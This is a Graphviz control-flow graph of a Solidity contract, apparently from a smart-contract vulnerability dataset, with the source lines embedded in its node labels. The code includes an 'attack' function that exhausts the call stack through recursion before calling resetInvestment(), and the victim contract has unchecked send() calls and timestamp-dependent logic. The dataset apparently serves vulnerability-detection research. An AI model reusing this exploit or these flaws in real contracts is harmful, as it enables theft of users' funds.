digraph  {
13 [label="2_ address public owner;\n13-new_variable-3-3", method="", type_label=new_variable];
18 [label="3_ address public lastInvestor;\n18-new_variable-4-4", method="", type_label=new_variable];
23 [label="4_ uint public jackpot = 1 ether;\n23-new_variable-5-5", method="", type_label=new_variable];
30 [label="5_ uint public lastInvestmentTimestamp;\n30-new_variable-6-6", method="", type_label=new_variable];
35 [label="6_ uint public ONE_MINUTE = 1 minutes;\n35-new_variable-7-7", method="", type_label=new_variable];
42 [label="7_ function Governmental() {\n    owner = msg.sender;\n    if (msg.value<1 ether) throw;\n  }\n42-function_definition-8-11", method="Governmental()", type_label=function_definition];
45 [label="8_ owner = msg.sender;\n45-expression_statement-9-9", method="Governmental()", type_label=expression_statement];
51 [label="9_ if_msg.value<1 ether\n51-if-10-10", method="Governmental()", type_label=if];
236 [label="9_ end_if", method="Governmental()", type_label=end_if];
58 [label="9_ throw;\n58-expression_statement-10-10", method="Governmental()", type_label=expression_statement];
60 [label="11_ function invest() {\n    if (msg.value<jackpot/2) throw;\n    lastInvestor = msg.sender;\n    jackpot += msg.value/2;\n    lastInvestmentTimestamp = block.timestamp;\n  }\n60-function_definition-12-17", method="invest()", type_label=function_definition];
63 [label="12_ if_msg.value<jackpot/2\n63-if-13-13", method="invest()", type_label=if];
248 [label="12_ end_if", method="invest()", type_label=end_if];
71 [label="12_ throw;\n71-expression_statement-13-13", method="invest()", type_label=expression_statement];
73 [label="13_ lastInvestor = msg.sender;\n73-expression_statement-14-14", method="invest()", type_label=expression_statement];
79 [label="14_ jackpot += msg.value/2;\n79-expression_statement-15-15", method="invest()", type_label=expression_statement];
87 [label="15_ lastInvestmentTimestamp = block.timestamp;\n87-expression_statement-16-16", method="invest()", type_label=expression_statement];
93 [label="17_ function resetInvestment() {\n    if (block.timestamp < lastInvestmentTimestamp+ONE_MINUTE)\n      throw;\n    lastInvestor.send(jackpot);\n    owner.send(this.balance-1 ether);\n    lastInvestor = 0;\n    jackpot = 1 ether;\n    lastInvestmentTimestamp = 0;\n  }\n93-function_definition-18-26", method="resetInvestment()", type_label=function_definition];
96 [label="18_ if_block.timestamp < lastInvestmentTimestamp+ONE_MINUTE\n96-if-19-20", method="resetInvestment()", type_label=if];
281 [label="18_ end_if", method="resetInvestment()", type_label=end_if];
104 [label="19_ throw;\n104-expression_statement-20-20", method="resetInvestment()", type_label=expression_statement];
106 [label="20_ lastInvestor.send(jackpot);\n106-expression_statement-21-21", method="resetInvestment()", type_label=expression_statement];
113 [label="21_ owner.send(this.balance-1 ether);\n113-expression_statement-22-22", method="resetInvestment()", type_label=expression_statement];
125 [label="22_ lastInvestor = 0;\n125-expression_statement-23-23", method="resetInvestment()", type_label=expression_statement];
129 [label="23_ jackpot = 1 ether;\n129-expression_statement-24-24", method="resetInvestment()", type_label=expression_statement];
134 [label="24_ lastInvestmentTimestamp = 0;\n134-expression_statement-25-25", method="resetInvestment()", type_label=expression_statement];
141 [label="28_ function attack(address target, uint count) {\n    if (0<=count && count<1023) {\n      this.attack.gas(msg.gas-2000)(target, count+1);\n    }\n    else {\n      Governmental(target).resetInvestment();\n    }\n  }\n141-function_definition-29-36", method="attack(address target,uint count)", type_label=function_definition];
152 [label="29_ if_0<=count && count<1023\n152-if-30-35", method="attack(address target,uint count)", type_label=if];
337 [label="29_ end_if", method="attack(address target,uint count)", type_label=end_if];
161 [label="30_ this.attack.gas(msg.gas-2000)(target, count+1);\n161-expression_statement-31-31", method="attack(address target,uint count)", type_label=expression_statement];
182 [label="33_ Governmental(target).resetInvestment();\n182-expression_statement-34-34", method="attack(address target,uint count)", type_label=expression_statement];
1 [label="0_ start_node", method="", type_label=start];
2 [label="0_ exit_node", method="", type_label=exit];
13 -> 18  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
18 -> 23  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
23 -> 30  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
30 -> 35  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
42 -> 45  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
45 -> 51  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
51 -> 58  [color=red, controlflow_type=pos_next, edge_type=CFG_edge, key=0, label=pos_next];
51 -> 236  [color=red, controlflow_type=neg_next, edge_type=CFG_edge, key=0, label=neg_next];
236 -> 60  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
58 -> 236  [color=red, controlflow_type=end_if, edge_type=CFG_edge, key=0, label=end_if];
60 -> 63  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
63 -> 71  [color=red, controlflow_type=pos_next, edge_type=CFG_edge, key=0, label=pos_next];
63 -> 248  [color=red, controlflow_type=neg_next, edge_type=CFG_edge, key=0, label=neg_next];
248 -> 73  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
71 -> 248  [color=red, controlflow_type=end_if, edge_type=CFG_edge, key=0, label=end_if];
73 -> 79  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
79 -> 87  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
93 -> 96  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
96 -> 104  [color=red, controlflow_type=pos_next, edge_type=CFG_edge, key=0, label=pos_next];
96 -> 281  [color=red, controlflow_type=neg_next, edge_type=CFG_edge, key=0, label=neg_next];
281 -> 106  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
104 -> 281  [color=red, controlflow_type=end_if, edge_type=CFG_edge, key=0, label=end_if];
106 -> 113  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
113 -> 125  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
125 -> 129  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
129 -> 134  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
141 -> 152  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
152 -> 161  [color=red, controlflow_type=pos_next, edge_type=CFG_edge, key=0, label=pos_next];
152 -> 182  [color=red, controlflow_type=neg_next, edge_type=CFG_edge, key=0, label=neg_next];
337 -> 2  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
161 -> 337  [color=red, controlflow_type=end_if, edge_type=CFG_edge, key=0, label=end_if];
182 -> 337  [color=red, controlflow_type=end_if, edge_type=CFG_edge, key=0, label=end_if];
}
